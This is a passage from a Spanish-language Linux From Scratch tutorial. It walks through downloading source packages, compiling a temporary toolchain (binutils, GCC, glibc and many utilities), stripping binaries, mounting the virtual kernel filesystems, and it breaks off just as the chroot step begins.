https://ftp.gnu.org/gnu/mpc/mpc-1.1.0.tar.gz
http://www.mpfr.org/mpfr-4.0.2/mpfr-4.0.2.tar.xz
https://github.com/ninja-build/ninja/archive/v1.10.0/ninja-1.10.0.tar.gz
http://ftp.gnu.org/gnu/ncurses/ncurses-6.2.tar.gz
https://www.openssl.org/source/openssl-1.1.1d.tar.gz
http://ftp.gnu.org/gnu/patch/patch-2.7.6.tar.xz
https://www.cpan.org/src/5.0/perl-5.30.1.tar.xz
https://pkg-config.freedesktop.org/releases/pkg-config-0.29.2.tar.gz
https://sourceforge.net/projects/procps-ng/files/Production/procps-ng-3.3.15.tar.xz
https://sourceforge.net/projects/psmisc/files/psmisc/psmisc-23.2.tar.xz
https://www.python.org/ftp/python/3.8.1/Python-3.8.1.tar.xz
https://www.python.org/ftp/python/doc/3.8.1/python-3.8.1-docs-html.tar.bz2
http://ftp.gnu.org/gnu/readline/readline-8.0.tar.gz
http://ftp.gnu.org/gnu/sed/sed-4.8.tar.xz
https://github.com/shadow-maint/shadow/releases/download/4.8.1/shadow-4.8.1.tar.xz
http://www.infodrom.org/projects/sysklogd/download/sysklogd-1.5.1.tar.gz
http://download.savannah.gnu.org/releases/sysvinit/sysvinit-2.96.tar.xz
http://ftp.gnu.org/gnu/tar/tar-1.32.tar.xz
https://downloads.sourceforge.net/tcl/tcl8.6.10-src.tar.gz
http://ftp.gnu.org/gnu/texinfo/texinfo-6.7.tar.xz
https://www.iana.org/time-zones/repository/releases/tzdata2019c.tar.gz
http://anduin.linuxfromscratch.org/LFS/udev-lfs-20171102.tar.xz
https://www.kernel.org/pub/linux/utils/util-linux/v2.35/util-linux-2.35.1.tar.xz
http://anduin.linuxfromscratch.org/LFS/vim-8.2.0190.tar.gz
https://cpan.metacpan.org/authors/id/T/TO/TODDR/XML-Parser-2.46.tar.gz
https://tukaani.org/xz/xz-5.2.4.tar.xz
https://zlib.net/zlib-1.2.11.tar.xz
https://github.com/facebook/zstd/releases/download/v1.4.4/zstd-1.4.4.tar.gz
http://www.linuxfromscratch.org/patches/lfs/9.1/bash-5.0-upstream_fixes-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/bzip2-1.0.8-install_docs-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/coreutils-8.31-i18n-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/glibc-2.31-fhs-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/kbd-2.2.0-backspace-1.patch
http://www.linuxfromscratch.org/patches/lfs/9.1/sysvinit-2.96-consolidated-1.patch
```

De nada. Una vez hecho, lo único que tendréis que hacer es ejecutar el siguiente comando:

```bash
wget --input-file=wget-list --continue --directory-prefix=$LFS/sources
```

Este proceso puede tardar un buen rato... así que te recomiendo que salgas a dar una vuelta o a despejarte. 

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/347Qa.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Nos situaremos en el directorio '*$LFS/sources*', deberíamos ver algo como esto una vez finalizado:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3483C.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Es decir, deberíamos tener todos los recursos en un principio descargados. 

Construyendo un sistema temporal
===============================================================================================================================

#### Creación de un nuevo usuario

En este punto, comenzaremos creando un directorio `tools` en '*$LFS/tools/*', posteriormente... crearemos un usuario a nivel de sistema con nombre `lfs`, ejecutando para ello los siguientes comandos:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34852.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Será necesario proporcionar una contraseña para el nuevo usuario `lfs`.

Una vez hecho, retocaremos el `.bash_profile` y el `.bashrc` de este nuevo usuario, adaptando el siguiente contenido:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34853.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ya con esto definido, aplicamos un `source` sobre estos 2 archivos y ya podremos continuar:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/34854.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Compilación de paquetes

En este punto, será necesario compilar una serie de paquetes de los previamente descargados a través del archivo `wget-list`. Recomiendo tener esta guía abierta para copiar y pegar algunos de los comandos, pues estos en ocasiones son algo largos.

##### Compilación binutils

Para comenzar con la compilación de este paquete, lo que haremos será dirigirnos a la ruta '*$LFS/sources*', descomprimiremos el archivo `binutils-2.34.tar.xz`, nos meteremos dentro de este y ejecutaremos los siguientes comandos:

```bash
mkdir -v build
cd build

../configure --prefix=/tools            \
             --with-sysroot=$LFS        \
             --with-lib-path=/tools/lib \
             --target=$LFS_TGT          \
             --disable-nls              \
             --disable-werror

make

case $(uname -m) in
  x86_64) mkdir -v /tools/lib &amp;&amp; ln -sv lib /tools/lib64 ;;
esac

make install
```

Una vez hecho, ya tendríamos esta utilidad instalada... y lo único que tendríamos que hacer es retroceder a nivel de directorios y borrar el mismo:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3486D.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación GCC

Este paquete depende a su vez de otros 3 paquetes, así que tras su descompresión, haremos lo siguiente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3486N.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Por aquí os dejo los comandos:

```bash
tar -xf gcc-9.2.0.tar.xz

cd gcc-9.2.0

tar -xf ../mpfr-4.0.2.tar.xz
mv -v mpfr-4.0.2 mpfr
tar -xf ../gmp-6.2.0.tar.xz
mv -v gmp-6.2.0 gmp
tar -xf ../mpc-1.1.0.tar.gz
mv -v mpc-1.1.0 mpc
```

Una vez hecho, ejecutaremos los siguientes comandos:

```bash
for file in gcc/config/{linux,i386/linux{,64}}.h
do
  cp -uv $file{,.orig}
  sed -e 's@/lib\(64\)\?\(32\)\?/ld@/tools&amp;@g' \
      -e 's@/usr@/tools@g' $file.orig &gt; $file
  echo '
#undef STANDARD_STARTFILE_PREFIX_1
#undef STANDARD_STARTFILE_PREFIX_2
#define STANDARD_STARTFILE_PREFIX_1 &quot;/tools/lib/&quot;
#define STANDARD_STARTFILE_PREFIX_2 &quot;&quot;' &gt;&gt; $file
  touch $file.orig
done

case $(uname -m) in
  x86_64)
    sed -e '/m64=/s/lib64/lib/' \
        -i.orig gcc/config/i386/t-linux64
 ;;
esac

mkdir -v build
cd build

../configure                                       \
    --target=$LFS_TGT                              \
    --prefix=/tools                                \
    --with-glibc-version=2.11                      \
    --with-sysroot=$LFS                            \
    --with-newlib                                  \
    --without-headers                              \
    --with-local-prefix=/tools                     \
    --with-native-system-header-dir=/tools/include \
    --disable-nls                                  \
    --disable-shared                               \
    --disable-multilib                             \
    --disable-decimal-float                        \
    --disable-threads                              \
    --disable-libatomic                            \
    --disable-libgomp                              \
    --disable-libquadmath                          \
    --disable-libssp                               \
    --disable-libvtv                               \
    --disable-libstdcxx                            \
    --enable-languages=c,c++

make
make install
```

**Anotación**: Este paquete puede tardar un poco en instalarse, así que paciencia.

Una vez instalado, podremos retroceder a nivel de directorios y borrar el recurso descomprimido sin mayor inconveniente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/3489L.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación API Headers

En este caso, descomprimiremos el archivo `linux-5.5.3.tar.xz` y ejecutaremos los siguientes comandos:

```bash
make mrproper
make headers
cp -rv usr/include/* /tools/include
cd ..
rm -rf linux-5.5.3
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ac.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Glibc

Para la instalación de **Glibc**, ejecutaremos los siguientes comandos:

```bash
tar -xf glibc-2.31.tar.xz
mkdir -v build
cd       build

../configure                             \
      --prefix=/tools                    \
      --host=$LFS_TGT                    \
      --build=$(../scripts/config.guess) \
      --enable-kernel=3.2                \
      --with-headers=/tools/include

make
make install
```

Una vez hecho, aplicaremos el siguiente comando para validar que las funciones básicas (compilación y linking) de la nueva toolchain están trabajando correctamente:

```bash
echo 'int main(){}' &gt; dummy.c
$LFS_TGT-gcc dummy.c
readelf -l a.out | grep ': /tools'
```

Si al ejecutarlo nos sale el siguiente mensaje:

```bash
[Requesting program interpreter: /tools/lib64/ld-linux-x86-64.so.2]
```

Entonces nos podremos quedar tranquilos. Posteriormente, borramos estos archivos:

```bash
rm -v dummy.c a.out
cd ../..
rm -rf glibc-2.31
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ei.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Ojo cuidado, ¡hagamos una Snapshot que ya hemos avanzado considerablemente!:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ev.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Libstdc de GCC

Para instalar esta utilidad, necesitaremos volver a descomprimir el archivo `gcc-9.2.0.tar.xz` una vez más. Una vez hecho, aplicaremos los siguientes comandos dentro del directorio descomprimido:

```bash
mkdir -v build
cd build

../libstdc++-v3/configure           \
    --host=$LFS_TGT                 \
    --prefix=/tools                 \
    --disable-multilib              \
    --disable-nls                   \
    --disable-libstdcxx-threads     \
    --disable-libstdcxx-pch         \
    --with-gxx-include-dir=/tools/$LFS_TGT/include/c++/9.2.0

make
make install
```

Una vez finalizado, como siempre... retrocedemos 2 directorios y borramos el directorio:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348kG.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Binutils Fase 2

Una vez más, volveremos a descomprimir el comprimido `binutils-2.34.tar.xz` y aplicaremos los siguientes comandos:

```bash
tar -xf binutils-2.34.tar.xz
cd binutils-2.34

mkdir -v build
cd build

CC=$LFS_TGT-gcc                \
AR=$LFS_TGT-ar                 \
RANLIB=$LFS_TGT-ranlib         \
../configure                   \
    --prefix=/tools            \
    --disable-nls              \
    --disable-werror           \
    --with-lib-path=/tools/lib \
    --with-sysroot

make
make install

make -C ld clean
make -C ld LIB_PATH=/usr/lib:/lib
cp -v ld/ld-new /tools/bin
```

Una vez hecho, la misma historia de siempre... retrocedemos 2 directorios y borramos el directorio:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348nQ.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación GCC Fase 2

Descomprimiremos una vez más el archivo `gcc-9.2.0.tar.xz` y aplicaremos los siguientes comandos a nivel de sistema:

```bash
cat gcc/limitx.h gcc/glimits.h gcc/limity.h &gt; \
  `dirname $($LFS_TGT-gcc -print-libgcc-file-name)`/include-fixed/limits.h

for file in gcc/config/{linux,i386/linux{,64}}.h
do
  cp -uv $file{,.orig}
  sed -e 's@/lib\(64\)\?\(32\)\?/ld@/tools&amp;@g' \
      -e 's@/usr@/tools@g' $file.orig &gt; $file
  echo '
#undef STANDARD_STARTFILE_PREFIX_1
#undef STANDARD_STARTFILE_PREFIX_2
#define STANDARD_STARTFILE_PREFIX_1 &quot;/tools/lib/&quot;
#define STANDARD_STARTFILE_PREFIX_2 &quot;&quot;' &gt;&gt; $file
  touch $file.orig
done

case $(uname -m) in
  x86_64)
    sed -e '/m64=/s/lib64/lib/' \
        -i.orig gcc/config/i386/t-linux64
  ;;
esac

tar -xf ../mpfr-4.0.2.tar.xz
mv -v mpfr-4.0.2 mpfr
tar -xf ../gmp-6.2.0.tar.xz
mv -v gmp-6.2.0 gmp
tar -xf ../mpc-1.1.0.tar.gz
mv -v mpc-1.1.0 mpc

sed -e '1161 s|^|//|' \
    -i libsanitizer/sanitizer_common/sanitizer_platform_limits_posix.cc

mkdir -v build
cd build
```

Toda esta parte debería devolver un output limpio como el siguiente:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348ou.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Llegados a este punto ejecutamos los siguientes comandos:

```bash
CC=$LFS_TGT-gcc                                    \
CXX=$LFS_TGT-g++                                   \
AR=$LFS_TGT-ar                                     \
RANLIB=$LFS_TGT-ranlib                             \
../configure                                       \
    --prefix=/tools                                \
    --with-local-prefix=/tools                     \
    --with-native-system-header-dir=/tools/include \
    --enable-languages=c,c++                       \
    --disable-libstdcxx-pch                        \
    --disable-multilib                             \
    --disable-bootstrap                            \
    --disable-libgomp

make
make install
ln -sv gcc /tools/bin/cc
```

Igual que hicimos la primera vez, tendremos que validar que las funciones básicas (compilación y linking) de la nueva toolchain están funcionando correctamente:

```bash
echo 'int main(){}' &gt; dummy.c
cc dummy.c
readelf -l a.out | grep ': /tools'
```

Teniendo que ver un output como el siguiente:

```bash
[Requesting program interpreter: /tools/lib64/ld-linux-x86-64.so.2]
```

Si eso es así, buen trabajo. Eliminamos los ficheros y directorios innecesarios:

```bash
rm -v dummy.c a.out
cd ../..
rm -rf gcc-9.2.0
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348qv.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Tcl

Para la instalación de este paquete, tendremos que descomprimir el comprimido `tcl8.6.10-src.tar.gz`. Posteriormente, ejecutaremos los siguientes comandos dentro del directorio:

```bash
cd unix

./configure --prefix=/tools

make
TZ=UTC make test
make install

chmod -v u+w /tools/lib/libtcl8.6.so
make install-private-headers
ln -sv tclsh8.6 /tools/bin/tclsh
```

Una vez terminado, retrocedemos 2 directorios y borramos el directorio:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348rB.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Expect

Para la instalación de este paquete, tendremos que descomprimir el comprimido `expect5.45.4.tar.gz`, posteriormente, ejecutaremos los siguientes comandos dentro del directorio:

```bash
cp -v configure{,.orig}
sed 's:/usr/local/bin:/bin:' configure.orig &gt; configure

./configure --prefix=/tools       \
            --with-tcl=/tools/lib \
            --with-tclinclude=/tools/include

make
make test
make SCRIPTS=&quot;&quot; install
```

Una vez finalizado, retrocedemos 1 directorio y borramos el directorio principal:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348s6.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación DejaGNU

La instalación de este paquete es bastante rápida. En primer lugar, descomprimimos el comprimido `dejagnu-1.6.2.tar.gz`. Posteriormente, ejecutamos los siguientes comandos:

```bash
./configure --prefix=/tools
make install
make check
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348sm.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación M4

Para instalar este paquete, descomprimiremos el comprimido `m4-1.4.18.tar.xz`, nos meteremos en el directorio descomprimido y efectuaremos los siguientes comandos:

```bash
sed -i 's/IO_ftrylockfile/IO_EOF_SEEN/' lib/*.c
echo &quot;#define _IO_IN_BACKUP 0x100&quot; &gt;&gt; lib/stdio-impl.h

./configure --prefix=/tools

make
make check
make install
```

Durante el `make check`, deberíamos ver algo como esto:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348tc.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Una vez finalizada la instalación, retrocedemos un directorio y borramos el directorio principal:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348td.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Ncurses

Para instalar este paquete, necesitaremos descomprimir el comprimido con nombre `ncurses-6.2.tar.gz`. Una vez hecho, aplicaremos los siguientes comandos dentro del directorio descomprimido:

```bash
sed -i s/mawk// configure

./configure --prefix=/tools \
            --with-shared   \
            --without-debug \
            --without-ada   \
            --enable-widec  \
            --enable-overwrite

make
make install
ln -s libncursesw.so /tools/lib/libncurses.so
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Ncurses.

##### Compilación Bash

Para instalar este paquete, necesitaremos descomprimir el comprimido con nombre `bash-5.0.tar.gz`. Una vez hecho, ejecutaremos los siguientes comandos dentro del directorio descomprimido:

```bash
./configure --prefix=/tools --without-bash-malloc
make
make tests
make install
ln -sv bash /tools/bin/sh
```

Una vez hecho, retrocederemos un directorio y borraremos el directorio principal de Bash:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348v6.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Bison

Para la compilación de este paquete, haremos uso del paquete `bison-3.5.2.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools

make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Bison:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348w3.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Bzip2

Para la compilación de este paquete, haremos uso del paquete `bzip2-1.0.8.tar.gz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
make -f Makefile-libbz2_so
make clean

make

make PREFIX=/tools install
cp -v bzip2-shared /tools/bin/bzip2
cp -av libbz2.so* /tools/lib
ln -sv libbz2.so.1.0 /tools/lib/libbz2.so
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Bzip2:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348wj.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Coreutils

Para la compilación de este paquete, haremos uso del paquete `coreutils-8.31.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools --enable-install-program=hostname

make
make RUN_EXPENSIVE_TESTS=yes check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Coreutils:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348xi.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Diffutils

Para la compilación de este paquete, haremos uso del paquete `diffutils-3.7.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Diffutils:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348xB.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación File

Para la compilación de este paquete, haremos uso del paquete `file-5.38.tar.gz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de File:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348xH.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Findutils

Para la compilación de este paquete, haremos uso del paquete `findutils-4.7.0.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Findutils:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348y1.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

Bueno, en este punto... como ya hemos avanzado considerablemente, ¡toca hacer otro Snapshot!:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/348yu.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Gawk

Para la compilación de este paquete, haremos uso del paquete `gawk-5.0.1.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

**Importante**: Es probable que el `make check` devuelva errores, pero no hay de qué preocuparse.

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Gawk:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349ii.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Gettext

Para la compilación de este paquete, haremos uso del paquete `gettext-0.20.1.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --disable-shared
make
cp -v gettext-tools/src/{msgfmt,msgmerge,xgettext} /tools/bin
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Gettext:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349iX.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Grep

Para la compilación de este paquete, haremos uso del paquete `grep-3.4.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools

make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Grep:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349jf.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Gzip

Para la compilación de este paquete, haremos uso del paquete `gzip-1.10.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools

make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Gzip:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349jy.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Make

Para la compilación de este paquete, haremos uso del paquete `make-4.3.tar.gz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools --without-guile

make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Make:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349jQ.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Patch

Para la compilación de este paquete, haremos uso del paquete `patch-2.7.6.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools

make
make check
make install
```

En este paquete, a la hora de hacer un `make check`, es posible que el campo **XFAIL** devuelve 2 errores, esto es normal y no habrá de qué preocuparse.

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Patch:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349k9.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Perl

Para la compilación de este paquete, haremos uso del paquete `perl-5.30.1.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
sh Configure -des -Dprefix=/tools -Dlibs=-lm -Uloclibpth -Ulocincpth

make
cp -v perl cpan/podlators/scripts/pod2man /tools/bin
mkdir -pv /tools/lib/perl5/5.30.1
cp -Rv lib/* /tools/lib/perl5/5.30.1
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Perl:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349kE.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Python

Para la compilación de este paquete, haremos uso del paquete `Python-3.8.1.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
sed -i '/def add_multiarch_paths/a \        return' setup.py
./configure --prefix=/tools --without-ensurepip
make
make install
```

**Anotación**: Si al hacer un `make install` en la fase final da un error, lo que habrá que hacer será volver a descomprimir el comprimido de Python y esta vez en el archivo `setup.py`, nos iremos nosotros manualmente a la línea que pone `add_multiarch_paths`. Una vez situados, justamente debajo de la función, correctamente tabulado pondremos la palabra `return`.

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Python:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349mg.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Sed

Para la compilación de este paquete, haremos uso del paquete `sed-4.8.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Sed:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349mu.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Tar

Para la compilación de este paquete, haremos uso del paquete `tar-1.32.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Tar:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349n3.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Texinfo

Para la compilación de este paquete, haremos uso del paquete `texinfo-6.7.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Texinfo:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349oM.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

##### Compilación Xz

Madre mía, último paquete a instalar... si señor, buen trabajo. Aún así prepárate, que luego vendrán muchos más.

Para la compilación de este paquete, haremos uso del paquete `xz-5.2.4.tar.xz`. Una vez descomprimido, nos meteremos dentro del directorio descomprimido y aplicaremos los siguientes comandos:

```bash
./configure --prefix=/tools
make
make check
make install
```

Una vez hecho, retrocedemos un directorio y borramos el directorio principal de Xz:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349p5.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Stripping

Este apartado es totalmente opcional, irá destinado a eliminar elementos innecesarios. Pensemos en que los ejecutables y las bibliotecas construidas hasta ahora contienen aproximadamente unos 70 MB de símbolos de depuración innecesarios.

Para eliminar estos símbolos, podemos ejecutar el siguiente comando:

```bash
strip --strip-debug /tools/lib/*
/usr/bin/strip --strip-unneeded /tools/{,s}bin/*
```

Para salvar más espacio, eliminaremos las documentaciones y archivos innecesarios:

```bash
rm -rf /tools/{,share}/{info,man,doc}
find /tools/{lib,libexec} -name \*.la -delete
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349pq.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

En este punto, toca hacer una nueva Snapshot antes de continuar:

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349pt.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Cambio de Propietario

Actualmente, la ruta '*$LFS/tools*' tiene como propietario asignado al usuario **lfs**, un usuario que existe sólo en el sistema host.

Lo que haremos por el momento será cambiar el propietario y el grupo asignado de forma recursiva al usuario **root**, de la siguiente forma:

```bash
chown -R root:root $LFS/tools
```

**IMPORTANTE**: Esto hay que hacerlo como el usuario `root`, por tanto, ejecutamos primero el comando **exit** para salir de la sesión del usuario `lfs`.

Construyendo el sistema LFS
===============================================================================================================================

#### Preparando el sistema de archivos del kernel virtual
Comenzaremos creando los directorios en los que se montarán los sistemas de archivos:

```bash
mkdir -pv $LFS/{dev,proc,sys,run}
```

Cuando el kernel arranca el sistema, se requiere de la presencia de unos pocos nodos de dispositivo, en particular los dispositivos `console` y `nul`. Estos nodos del dispositivo deben crearse en el disco duro para que estén disponibles antes de que se inicie `udevd` y, además, cuando se inicie Linux `init=/bin/bash`.

Podemos crear estos dispositivos ejecutando los siguientes comandos:

```bash
mknod -m 600 $LFS/dev/console c 5 1
mknod -m 666 $LFS/dev/null c 1 3
```

Ya en este punto, crearemos un sistema de archivos virtual en el directorio `/dev` para permitir que los dispositivos se creen dinámicamente a medida que estos son detectados o accedidos:

```bash
mount -v --bind /dev $LFS/dev
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349qt.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Montaje del sistema de archivos del kernel virtual

En este punto, montaremos los sistemas de archivos del kernel virtual restantes:

```bash
mount -vt devpts devpts $LFS/dev/pts -o gid=5,mode=620
mount -vt proc proc $LFS/proc
mount -vt sysfs sysfs $LFS/sys
mount -vt tmpfs tmpfs $LFS/run
```

En algunos sistemas host, `/dev/shm` es un enlace simbólico a `/run/shm`. El `tmpfs` **/run** fue montado arriba, por tanto en este caso... sólo es necesario crear un directorio:

```bash
if [ -h $LFS/dev/shm ]; then
  mkdir -pv $LFS/$(readlink $LFS/dev/shm)
fi
```

&lt;p align=&quot;center&quot;&gt;
     &lt;img src=&quot;https://funkyimg.com/i/349qC.png&quot;&gt;
&lt;/p&gt;&lt;br&gt;

#### Entrando en el entorno Chroot

A partir de aquí, ingresaremos al entorno chroot para comenzar a construir e instalar nuestro sistema Linux final.

Como el usuario **root**, ejecutaremos el siguiente comando:

```bash
